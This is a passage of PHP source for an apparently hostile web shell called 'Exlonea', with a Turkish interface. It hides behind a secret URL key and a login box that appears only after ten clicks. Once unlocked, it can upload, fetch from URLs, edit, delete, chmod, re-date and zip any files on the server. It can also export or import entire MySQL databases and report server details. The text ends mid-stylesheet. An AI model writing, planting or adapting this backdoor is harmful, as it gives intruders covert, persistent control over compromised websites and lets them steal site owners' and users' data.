<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
@chmod(__FILE__, 0777);
session_start();
$PASSWORD_HASH = '2b792dabb4328a140caef066322c49ff';
$KEY_PARAM = 'exlonea';
$key_is_present = isset($_GET['key']) && $_GET['key'] === $KEY_PARAM;
if (!$key_is_present) {
    echo '<!DOCTYPE html><html><head></head><body></body></html>';
    exit;
}
$AUTH_FAILED = false;
if (isset($_GET['logout'])) {
    $_SESSION = array();
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
            $params["path"], $params["domain"],
            $params["secure"], $params["httponly"]
        );
    }
    session_destroy();
    header("Location: " . basename(__FILE__) . "?key=" . $KEY_PARAM);
    exit;
}
if (isset($_POST['password'])) {
    if (md5($_POST['password']) === $PASSWORD_HASH) {
        $_SESSION['authenticated'] = true;
        $currentDir = realpath(isset($_GET['dir']) ? $_GET['dir'] : getcwd()) ?: getcwd();
        header("Location: ?dir=" . urlencode($currentDir) . "&key=" . $KEY_PARAM);
        exit;
    } else {
        $AUTH_FAILED = true;
    }
}
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    $error = $AUTH_FAILED ? "Hatalı şifre!" : "";
    echo '<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><title></title><meta name="viewport" content="width=device-width, initial-scale=1.0"><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet"><style>body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; user-select: none; } .login-box { width: 100%; max-width: 330px; padding: 15px; margin: auto; border: 1px solid #ccc; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); background-color: #fff; display: none; } .login-icon { font-size: 3rem; color: #007bff; margin-bottom: 1rem; } @media (max-width: 576px) { .login-box { margin: 15px; } }</style></head><body><div class="login-box"><div class="text-center"><i class="bi bi-lock-fill login-icon"></i><h2 class="text-center mb-4">Giriş Yap</h2></div><form method="POST"><div class="mb-3"><input type="password" class="form-control" name="password" placeholder="Şifre" required></div><button type="submit" class="btn btn-primary w-100"><i class="bi bi-box-arrow-in-right"></i> Giriş Yap</button>' . ($error ? '<div class="alert alert-danger mt-3">' . $error . '</div>' : '') . '</form></div><script>let clicks=0;document.addEventListener("click",function(){clicks++;if(clicks===10){document.querySelector(".login-box").style.display="block";document.body.style.backgroundColor="#f8f9fa";document.title="Giriş";}});</script><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script></body></html>';
    exit;
}
if (!function_exists('unlink')) {
    function unlink($filename, $context = null) {
        return false;
    }
}
$baseDir = realpath(getcwd());
$scriptName = basename(__FILE__);
function getFileList($dir) {
    $files = array();
    $dirs = array();
    if (!is_dir($dir)) return array_merge($dirs, $files);
    $items = @scandir($dir);
    if ($items === false) return array_merge($dirs, $files);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $perms = fileperms($path) & 0777;
        $permStr = sprintf('%o', $perms);
        $entry = array(
            'name' => $item,
            'path' => $path,
            'type' => is_dir($path) ? 'dir' : 'file',
            'size' => is_file($path) ? filesize($path) : 0,
            'mtime' => @filemtime($path),
            'icon' => is_dir($path) ? 'bi bi-folder-fill text-warning' : getFileIcon($item),
            'perms' => $permStr
        );
        if (is_dir($path)) $dirs[] = $entry;
        else $files[] = $entry;
    }
    return array_merge($dirs, $files);
}
function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = array(
        'jpg' => 'bi bi-image', 'jpeg' => 'bi bi-image', 'png' => 'bi bi-image', 'gif' => 'bi bi-image',
        'php' => 'bi bi-file-code', 'html' => 'bi bi-file-code', 'css' => 'bi bi-file-code', 'js' => 'bi bi-file-code',
        'pdf' => 'bi bi-file-pdf', 'txt' => 'bi bi-file-text',
        'zip' => 'bi bi-file-zip-fill',
        'sql' => 'bi bi-file-earmark-database-fill text-info'
    );
    return $icons[$ext] ?? 'bi bi-file-earmark';
}
function formatSize($size) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $size = max($size, 0);
    $pow = floor(($size ? log($size) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $size /= pow(1024, $pow);
    return round($size, 2) . ' ' . $units[$pow];
}
function addFolderToZip($dir, $zipArchive, $zipDir = '') {
    if (is_dir($dir)) {
        if ($dh = opendir($dir)) {
            if(!empty($zipDir)) $zipArchive->addEmptyDir($zipDir);
            while (($file = readdir($dh)) !== false) {
                if ($file != '.' && $file != '..') {
                    if (is_dir($dir . DIRECTORY_SEPARATOR . $file)) {
                        addFolderToZip($dir . DIRECTORY_SEPARATOR . $file, $zipArchive, $zipDir . $file . '/');
                    } else {
                        $zipArchive->addFile($dir . DIRECTORY_SEPARATOR . $file, $zipDir . $file);
                    }
                }
            }
            closedir($dh);
        }
    }
}
function streamZip($files, $currentDir) {
    if (!class_exists('ZipArchive')) return false;
    $zipFileName = (count($files) === 1) ? basename($files[0]) . '.zip' : $_SERVER['HTTP_HOST'] . '.zip';
    $tempZip = tempnam(sys_get_temp_dir(), 'zip');
    $zip = new ZipArchive();
    if ($zip->open($tempZip, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) return false;
    foreach ($files as $file) {
        $fullPath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
        if ($fullPath && file_exists($fullPath)) {
            if (is_dir($fullPath)) {
                addFolderToZip($fullPath, $zip, basename($fullPath) . '/');
            } elseif (is_file($fullPath)) {
                $zip->addFile($fullPath, basename($fullPath));
            }
        }
    }
    $zip->close();
    if (file_exists($tempZip)) {
        if (ob_get_level()) ob_end_clean();
        header('Content-Description: File Transfer');
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zipFileName . '"');
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($tempZip));
        readfile($tempZip);
        @unlink($tempZip);
        exit;
    }
    return false;
}
function searchFiles($dir, $query) {
    $results = array();
    $files = getFileList($dir);
    foreach ($files as $file) {
        if (stripos($file['name'], $query) !== false) {
            $results[] = $file;
        }
    }
    return $results;
}
function getBreadcrumb($dir) {
    global $baseDir;
    global $KEY_PARAM;
    $parts = explode(DIRECTORY_SEPARATOR, realpath($dir));
    $baseParts = explode(DIRECTORY_SEPARATOR, $baseDir);
    $breadcrumb = array();
    $currentPath = '';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $currentPath .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb[] = array('name' => $part, 'path' => $currentPath);
    }
    return $breadcrumb;
}
function deleteRecursive($path) {
    if (!file_exists($path)) return false;
    if (is_dir($path)) {
        $items = @scandir($path);
        if ($items !== false) {
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                deleteRecursive($path . DIRECTORY_SEPARATOR . $item);
            }
            return @rmdir($path);
        }
        return false;
    } elseif (is_file($path)) {
        return @unlink($path);
    }
    return false;
}
function copyDirectory($source, $destination) {
    if (!is_dir($destination)) {
        @mkdir($destination, 0777, true);
    }
    $dir = opendir($source);
    while (($file = readdir($dir)) !== false) {
        if ($file != '.' && $file != '..') {
            if (is_dir($source . DIRECTORY_SEPARATOR . $file)) {
                copyDirectory($source . DIRECTORY_SEPARATOR . $file, $destination . DIRECTORY_SEPARATOR . $file);
            } else {
                @copy($source . DIRECTORY_SEPARATOR . $file, $destination . DIRECTORY_SEPARATOR . $file);
            }
        }
    }
    closedir($dir);
}
function getServerFileUrl($filePath) {
    global $baseDir;
    $documentRoot = realpath($_SERVER['DOCUMENT_ROOT']);
    if ($documentRoot && strpos($filePath, $documentRoot) === 0) {
        $relativePath = str_replace($documentRoot, '', $filePath);
        $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') ? 'https' : 'http';
        return $scheme . '://' . $_SERVER['HTTP_HOST'] . str_replace('\\', '/', $relativePath);
    }
    return false;
}
function getServerInfo() {
    $info = array(
        'uname' => php_uname(),
        'user_id' => get_current_user() ?: 'N/A',
        'php_version' => phpversion(),
        'safe_mode' => ini_get('safe_mode') ? 'ON' : 'OFF',
        'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
        'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
        'datetime' => date('Y-m-d H:i:s'),
        'hdd_total' => disk_total_space('/') ?? 0,
        'hdd_free' => disk_free_space('/') ?? 0
    );
    return $info;
}
function improvedUploadFile($uploadDir, $fileInputName) {
    if (!isset($_FILES[$fileInputName]) || empty($_FILES[$fileInputName]['name'][0])) {
        return array('success' => false, 'error' => 'Dosya seçilmedi!', 'results' => array());
    }
    $results = array();
    $files = $_FILES[$fileInputName];
    $fileCount = count($files['name']);
    if (!is_dir($uploadDir)) {
        @mkdir($uploadDir, 0777, true);
    }
    for ($i = 0; $i < $fileCount; $i++) {
        if ($files['error'][$i] !== UPLOAD_ERR_OK) {
            $errors = array(
                UPLOAD_ERR_INI_SIZE => 'Dosya php.ini sınırını aşıyor',
                UPLOAD_ERR_FORM_SIZE => 'Dosya form sınırını aşıyor',
                UPLOAD_ERR_PARTIAL => 'Dosya kısmen yüklendi',
                UPLOAD_ERR_NO_FILE => 'Dosya seçilmedi',
                UPLOAD_ERR_NO_TMP_DIR => 'Geçici klasör yok',
                UPLOAD_ERR_CANT_WRITE => 'Diska yazılamadı',
                UPLOAD_ERR_EXTENSION => 'Uzantı tarafından engellendi'
            );
            $error = isset($errors[$files['error'][$i]]) ? $errors[$files['error'][$i]] : 'Bilinmeyen hata';
            $results[] = array('name' => basename($files['name'][$i]), 'success' => false, 'error' => $error);
            continue;
        }
        $fileName = basename($files['name'][$i]);
        $tmpFile = $files['tmp_name'][$i];
        $targetFile = $uploadDir . DIRECTORY_SEPARATOR . $fileName;
        if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
            $results[] = array('name' => $fileName, 'success' => false, 'error' => 'Geçersiz dosya adı');
            continue;
        }
        if (is_uploaded_file($tmpFile)) {
            if (@move_uploaded_file($tmpFile, $targetFile)) {
                @chmod($targetFile, 0777);
                $fullUrl = getServerFileUrl($targetFile);
                $results[] = array('name' => $fileName, 'success' => true, 'url' => $fullUrl);
            } else {
                $results[] = array('name' => $fileName, 'success' => false, 'error' => 'move_uploaded_file başarısız');
            }
        } else {
            if (@copy($tmpFile, $targetFile)) {
                @chmod($targetFile, 0777);
                $fullUrl = getServerFileUrl($targetFile);
                $results[] = array('name' => $fileName, 'success' => true, 'url' => $fullUrl);
            } else {
                $results[] = array('name' => $fileName, 'success' => false, 'error' => 'Yükleme başarısız');
            }
        }
    }
    return array('success' => true, 'results' => $results);
}
$action = $_GET['action'] ?? '';
$currentDir = realpath($_GET['dir'] ?? getcwd()) ?: getcwd();
$error = '';
$success = '';
$fileToEdit = isset($_GET['file_to_edit']) ? $_GET['file_to_edit'] : null;
if ($action === 'get_file_content' && isset($_GET['file'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_GET['file']);
    if ($file && is_file($file) && strpos($file, realpath($currentDir)) === 0) {
        $content = @file_get_contents($file);
        if ($content !== false) {
            header('Content-Type: application/json');
            echo json_encode([
                'content' => $content,
                'perms' => sprintf('%o', fileperms($file) & 0777),
                'mtime' => date('Y-m-d H:i:s', filemtime($file)),
                'url' => getServerFileUrl($file) ?: ''
            ]);
        } else {
            header('Content-Type: application/json', true, 500);
            echo json_encode(['error' => 'Dosya içeriği alınamadı!']);
        }
    } else {
        header('Content-Type: application/json', true, 404);
        echo json_encode(['error' => 'Dosya bulunamadı!']);
    }
    exit;
}
if ($action === 'upload' && isset($_POST['upload_type'])) {
    $uploadDir = $currentDir;
    if (isset($_POST['create_folder_on_upload']) && $_POST['create_folder_on_upload'] === 'yes' && !empty($_POST['upload_folder_name'])) {
        $folderName = $_POST['upload_folder_name'];
        $uploadDir = $currentDir . DIRECTORY_SEPARATOR . $folderName;
        if (!file_exists($uploadDir)) {
            @mkdir($uploadDir, 0777, true);
        }
    }
    if ($_POST['upload_type'] === 'file') {
        $uploadResult = improvedUploadFile($uploadDir, 'uploaded_files');
        if ($uploadResult['success']) {
            foreach($uploadResult['results'] as $result) {
                if ($result['success']) {
                    $fullUrl = $result['url'] ? '<a href="' . htmlspecialchars($result['url']) . '" target="_blank">Dosyayı Aç</a>' : '';
                    $success .= 'Yüklendi: ' . htmlspecialchars($result['name']) . ' ' . $fullUrl . '<br>';
                } else {
                    $error .= 'Yüklenemedi: ' . htmlspecialchars($result['name']) . ' (' . $result['error'] . ')<br>';
                }
            }
        } else {
            $error .= $uploadResult['error'] . '<br>';
        }
    } elseif ($_POST['upload_type'] === 'url' && !empty($_POST['urls'])) {
        $urls = explode("\n", $_POST['urls']);
        foreach ($urls as $url) {
            $url = trim($url);
            if (filter_var($url, FILTER_VALIDATE_URL)) {
                $fileName = $uploadDir . DIRECTORY_SEPARATOR . basename(parse_url($url, PHP_URL_PATH));
                $fileName = $fileName ?: $uploadDir . DIRECTORY_SEPARATOR . 'downloaded_file_' . time() . '_' . mt_rand();
                $content = @file_get_contents($url);
                if ($content !== false && file_put_contents($fileName, $content)) {
                    @chmod($fileName, 0777);
                    $fullUrl = getServerFileUrl($fileName);
                    $success .= 'İndirildi: <a href="' . $fullUrl . '" target="_blank">Dosyayı Aç</a><br>';
                } else {
                    $error .= 'İndirilemedi: ' . $url . '<br>';
                }
            } else {
                $error .= 'Geçersiz URL: ' . $url . '<br>';
            }
        }
    } else {
        $error = 'Dosya veya URL giriniz!';
    }
}
if ($action === 'delete' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $deleted = [];
    foreach ($files as $file) {
        $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
        if ($filePath && file_exists($filePath) && strpos($filePath, realpath($currentDir)) === 0) {
            if (deleteRecursive($filePath)) {
                $deleted[] = htmlspecialchars($file);
            } else {
                $error .= 'Silinemedi: ' . htmlspecialchars($file) . '<br>';
            }
        } else {
            $error .= 'Bulunamadı: ' . htmlspecialchars($file) . '<br>';
        }
    }
    if ($deleted) $success = 'Silindi: ' . implode(', ', $deleted);
    else $error = 'Silme hatası!';
}
if ($action === 'rename' && isset($_POST['old_name'], $_POST['new_name'])) {
    $oldPath = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['old_name']);
    $newPath = realpath($currentDir) . DIRECTORY_SEPARATOR . $_POST['new_name'];
    if ($oldPath && strpos($oldPath, realpath($currentDir)) === 0 && !file_exists($newPath)) {
        $success = @rename($oldPath, $newPath) ? 'Ad değiştirildi: ' . htmlspecialchars($_POST['new_name']) : 'Ad değiştirilemedi!';
        if ($success) @chmod($newPath, 0777);
    } else {
        $error = 'Adlandırma hatası!';
    }
}
if ($action === 'move' && isset($_POST['files'], $_POST['destination'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $moved = [];
    $destDir = realpath($_POST['destination']);
    if ($destDir && strpos($destDir, realpath($baseDir)) === 0) {
        foreach ($files as $file) {
            $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
            $dest = $destDir . DIRECTORY_SEPARATOR . basename($file);
            if ($filePath && !file_exists($dest) && strpos($filePath, realpath($currentDir)) === 0) {
                if (@rename($filePath, $dest)) {
                    $moved[] = htmlspecialchars(basename($file));
                    @chmod($dest, 0777);
                } else {
                    $error .= 'Taşınamadı: ' . htmlspecialchars($file) . '<br>';
                }
            } else {
                if (file_exists($dest)) {
                    $error .= 'Hedefte mevcut: ' . htmlspecialchars($dest) . '<br>';
                } else {
                    $error .= 'Geçersiz kaynak: ' . htmlspecialchars($file) . '<br>';
                }
            }
        }
        $success = $moved ? 'Taşındı: ' . implode(', ', $moved) : ($error ? $error : 'Taşıma başarısız!');
    } else {
        $error = 'Geçersiz hedef!';
    }
}
if ($action === 'copy' && isset($_POST['files'], $_POST['destination'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $copied = [];
    $destDir = realpath($_POST['destination']);
    if ($destDir && strpos($destDir, realpath($baseDir)) === 0) {
        foreach ($files as $file) {
            $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
            $dest = $destDir . DIRECTORY_SEPARATOR . basename($file);
            if ($filePath && !file_exists($dest) && strpos($filePath, realpath($currentDir)) === 0) {
                if (is_dir($filePath)) {
                    copyDirectory($filePath, $dest);
                    $copied[] = htmlspecialchars(basename($file));
                    @chmod($dest, 0777);
                } elseif (is_file($filePath)) {
                    if (@copy($filePath, $dest)) {
                        $copied[] = htmlspecialchars(basename($file));
                        @chmod($dest, 0777);
                    } else {
                        $error .= 'Kopyalanamadı: ' . htmlspecialchars($file) . '<br>';
                    }
                }
            } else {
                if (file_exists($dest)) {
                    $error .= 'Hedefte mevcut: ' . htmlspecialchars($dest) . '<br>';
                } else {
                    $error .= 'Geçersiz kaynak: ' . htmlspecialchars($file) . '<br>';
                }
            }
        }
        $success = $copied ? 'Kopyalandı: ' . implode(', ', $copied) : ($error ? $error : 'Kopyalama başarısız!');
    } else {
        $error = 'Geçersiz hedef!';
    }
}
if ($action === 'unzip' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    foreach ($files as $file) {
        $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
        if ($filePath && file_exists($filePath) && strpos($filePath, realpath($currentDir)) === 0) {
            $zip = new ZipArchive;
            if ($zip->open($filePath) === TRUE) {
                $zip->extractTo($currentDir);
                $zip->close();
                $success .= 'Çıkartıldı: ' . htmlspecialchars($file) . '<br>';
            } else {
                $error .= 'Çıkartılamadı: ' . htmlspecialchars($file) . '<br>';
            }
        }
    }
}
if ($action === 'download' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    if (count($files) === 1) {
        $firstFile = realpath($currentDir . DIRECTORY_SEPARATOR . $files[0]);
        if ($firstFile && strpos($firstFile, realpath($currentDir)) === 0) {
            if (is_file($firstFile)) {
                if (ob_get_level()) ob_end_clean();
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($firstFile) . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($firstFile));
                readfile($firstFile);
                exit;
            } elseif (is_dir($firstFile)) {
                $zipName = basename($firstFile) . '.zip';
                $zipPath = tempnam(sys_get_temp_dir(), 'zip_');
                $result = zipFolder($firstFile, $zipPath, true);
                if ($result['success']) {
                    if (ob_get_level()) ob_end_clean();
                    header('Content-Type: application/zip');
                    header('Content-Disposition: attachment; filename="' . $zipName . '"');
                    header('Content-Length: ' . filesize($zipPath));
                    readfile($zipPath);
                    @unlink($zipPath);
                    exit;
                } else {
                    $error = $result['error'];
                }
            } else {
                $error = 'Geçersiz dosya türü!';
            }
        } else {
            $error = 'İndirme hatası!';
        }
    } else {
        streamZip($files, $currentDir);
    }
}
if (($action === 'directzip' || $action === 'download_zip') && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    if (!empty($files)) {
        if(!streamZip($files, $currentDir)) {
            $error = 'Zipleme hatası!';
        }
    } else {
        $error = 'Dosya seçilmedi!';
    }
}
if ($action === 'sunucuyaziple' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $zipName = (count($files) === 1) ? $files[0] . '.zip' : $_SERVER['HTTP_HOST'] . '.zip';
    $zipPath = $currentDir . DIRECTORY_SEPARATOR . $zipName;
    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        foreach ($files as $file) {
            $fullPath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
            if ($fullPath && file_exists($fullPath)) {
                if (is_dir($fullPath)) {
                    addFolderToZip($fullPath, $zip, basename($fullPath) . '/');
                } elseif (is_file($fullPath)) {
                    $zip->addFile($fullPath, basename($fullPath));
                }
            }
        }
        $zip->close();
        @chmod($zipPath, 0777);
        $success = 'Sunucuya ziplendi: ' . htmlspecialchars($zipName);
    } else {
        $error = 'Zip oluşturulamadı!';
    }
}
if ($action === 'edit' && isset($_POST['file']) && isset($_POST['content'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    if ($file && is_file($file) && strpos($file, realpath($currentDir)) === 0) {
        $content = $_POST['content'];
        $bytesWritten = @file_put_contents($file, $content);
        if ($bytesWritten !== false) {
            @chmod($file, 0777);
            $fileUrl = getServerFileUrl($file);
            $success = 'Kaydedildi: ' . htmlspecialchars($_POST['file']) . ' (' . $bytesWritten . ' bayt) <a href="' . $fileUrl . '" target="_blank">Dosyayı Aç</a>';
        } else {
            $error = 'Kaydedilemedi!';
        }
    } else {
        $error = 'Geçersiz dosya!';
    }
}
if ($action === 'create_folder' && isset($_POST['folder_name'])) {
    $folderPath = $currentDir . DIRECTORY_SEPARATOR . $_POST['folder_name'];
    if (!file_exists($folderPath)) {
        if (@mkdir($folderPath, 0777, true)) {
            $success = 'Klasör oluşturuldu: ' . htmlspecialchars($_POST['folder_name']);
        } else {
            $error = 'Klasör oluşturulamadı!';
        }
    } else {
        $error = 'Klasör zaten var!';
    }
}
if ($action === 'create_file' && isset($_POST['file_name'])) {
    $fileName = $_POST['file_name'];
    $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
    if (!file_exists($filePath)) {
        if (@touch($filePath)) {
            if (file_put_contents($filePath, '') !== false) {
                @chmod($filePath, 0777);
                header("Location: ?dir=" . urlencode($currentDir) . "&key=" . $KEY_PARAM . "&file_to_edit=" . urlencode($fileName));
                exit;
            } else {
                $error = 'Dosya yazılamadı!';
                @unlink($filePath);
            }
        } else {
            $error = 'Dosya oluşturulamadı!';
        }
    } else {
        $error = 'Dosya zaten var!';
    }
}
if ($action === 'chmod' && isset($_POST['file']) && isset($_POST['perms'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    $perms = octdec($_POST['perms']);
    if ($file && strpos($file, realpath($currentDir)) === 0) {
        if (@chmod($file, $perms)) {
            $success = 'İzinler güncellendi: ' . htmlspecialchars($_POST['file']) . ' -> ' . $_POST['perms'];
        } else {
            $error = 'İzinler güncellenemedi!';
        }
    } else {
        $error = 'Geçersiz dosya!';
    }
}
if ($action === 'touch' && isset($_POST['file']) && isset($_POST['mtime'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    $mtime = strtotime($_POST['mtime']);
    if ($file && strpos($file, realpath($currentDir)) === 0) {
        if (@touch($file, $mtime)) {
            $success = 'Tarih güncellendi: ' . htmlspecialchars($_POST['file']) . ' -> ' . date('Y-m-d H:i:s', $mtime);
        } else {
            $error = 'Tarih güncellenemedi!';
        }
    } else {
        $error = 'Geçersiz dosya!';
    }
}
if ($action === 'database_export' && isset($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db'])) {
    try {
        if (!class_exists('mysqli')) throw new Exception("MySQLi yok!");
        $host = $_POST['host'];
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $db   = $_POST['db'];
        $conn = new mysqli($host, $user, $pass, $db);
        if ($conn->connect_error) {
            throw new Exception("Bağlantı hatası: " . $conn->connect_error);
        }
        $filename = preg_replace('/[^a-zA-Z0-9_]/', '', $db) . '_' . date('Y-m-d_H-i-s');
        $sql_file = $currentDir . DIRECTORY_SEPARATOR . $filename . '.sql';
        $fp = @fopen($sql_file, 'w');
        if (!$fp) {
            throw new Exception("SQL dosyası oluşturulamadı!");
        }
        $tables = array();
        $result = $conn->query("SHOW TABLES");
        while ($row = $result->fetch_array()) {
            $tables[] = $row[0];
        }
        foreach ($tables as $table) {
            fwrite($fp, "-- Table: `$table`\n");
            fwrite($fp, "DROP TABLE IF EXISTS `$table`;\n");
            $result = $conn->query("SHOW CREATE TABLE `$table`");
            $row = $result->fetch_array();
            fwrite($fp, $row[1] . ";\n\n");
            $result = $conn->query("SELECT * FROM `$table`");
            while ($row = $result->fetch_array(MYSQLI_ASSOC)) {
                $values = array_map(function ($v) use ($conn) {
                    return is_null($v) ? 'NULL' : "'" . $conn->real_escape_string($v) . "'";
                }, $row);
                fwrite($fp, "INSERT INTO `$table` VALUES (" . implode(",", $values) . ");\n");
            }
            fwrite($fp, "\n\n");
        }
        @fclose($fp);
        $conn->close();
        if (file_exists($sql_file)) {
            $fileSize = filesize($sql_file);
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($sql_file) . '"');
            header('Content-Length: ' . $fileSize);
            readfile($sql_file);
            @unlink($sql_file);
            exit;
        } else {
            throw new Exception("SQL dosyası oluşturulamadı!");
        }
    } catch (Exception $e) {
        $error = 'Veritabanı Export Hatası: ' . $e->getMessage();
    }
}
if ($action === 'database_import' && isset($_FILES['sql_file'])) {
    try {
        if (!class_exists('mysqli')) throw new Exception("MySQLi yok!");
        $host = $_POST['host'];
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $db   = $_POST['db'];
        $conn = new mysqli($host, $user, $pass, $db);
        if ($conn->connect_error) {
            throw new Exception("Bağlantı hatası: " . $conn->connect_error);
        }
        $file = $_FILES['sql_file']['tmp_name'];
        if (is_file($file)) {
            $query = file_get_contents($file);
            if ($conn->multi_query($query)) {
                do {
                    if ($result = $conn->store_result()) {
                        $result->free();
                    }
                } while ($conn->more_results() && $conn->next_result());
                $success = "Veritabanı içe aktarıldı.";
            } else {
                throw new Exception("SQL Hatası: " . $conn->error);
            }
        }
        $conn->close();
    } catch (Exception $e) {
        $error = 'İçe Aktarma Hatası: ' . $e->getMessage();
    }
}
if ($action === 'search' && isset($_GET['query'])) {
    $files = searchFiles($currentDir, $_GET['query']);
} else {
    $files = getFileList($currentDir);
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exlonea</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.10.1/ace.js" type="text/javascript" charset="utf-8"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/vs2015.min.css" id="highlightTheme">
    <style>
        body { background-color: #f8f9fa; }
        .table { font-size: 14px; }
        .modal-body input, .modal-body textarea { width: 100%; }
        h2 { font-family: 'Cinzel Decorative', cursive; font-weight: 400; }
        .breadcrumb a { text-decoration: none; }
        .footer { color: #6c757d; text-align: center; margin-top: 20px; }
        .file-icon { margin-right: 10px; } 
        .button-group { margin-bottom: 15px; display: flex; gap: 10px; flex-wrap: wrap; }
        .button-group button, .button-group a { min-width: 150px; }
        .table-responsive { max-height: 400px; overflow-y: auto; display: block; }
        .modal-dialog { max-width: 90%; }
        .table td:first-child, .table th:first-child { padding-left: 10px; text-align: left; width: 5%; }
        .header-icons { position: absolute; top: 10px; right: 10px; display: flex; gap: 10px; }
        .header-icons i { cursor: pointer; font-size: 24px; color: #343a40; }
        .header-icons i:hover { color: #007bff; }
        .self-highlight { color: red !important; font-weight: bold; }
        .btn-custom { background-color: #007bff; border-color: #007bff; color: #ffffff !important; }
        .btn-custom:hover, .btn-custom:focus, .btn-custom:active, .btn-custom.show { background-color: #0056b3 !important; border-color: #004085 !important; color: #ffffff !important; box-shadow: none; }
        .btn-green { background-color: #28a745; border-color: #28a745; color: #ffffff !important; }
        .btn-green:hover, .btn-green:focus, .btn-green:active, .btn-green.show { background-color: #1e7e34 !important; border-color: #1c7430 !important; color: #ffffff !important; box-shadow: none; }
        #editor { height: 60vh; border: 1px solid #ccc; border-radius: 4px; width: 100%; }
        .ace_editor { font-size: 14px; }
        .editor-container { display: flex; height: 50vh; border: 1px solid #ccc; overflow: hidden; position: relative; background-color: #1e1e1e; }
        .editor-container.light-mode { background-color: #ffffff; }
        .line-numbers { width: 50px; padding: 10px 5px; text-align: right; background-color: #252525; color: #858585; font-size: 14px; overflow: hidden; flex-shrink: 0; user-select: none; line-height: 1.5; font-family: 'Courier New', monospace; }
        .line-numbers.light-mode { background-color: #f5f5f5; color: #999; }
        .line-number-line { padding-right: 5px; white-space: pre; }
        .code-textarea { flex-grow: 1; padding: 10px; border: none; resize: none; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.5; white-space: pre; word-wrap: normal; overflow: auto; background-color: transparent; color: #d4d4d4; position: absolute; top: 0; left: 50px; right: 0; bottom: 0; z-index: 2; caret-color: #d4d4d4; }
        .editor-container.light-mode .code-textarea { color: #000; caret-color: #000; }
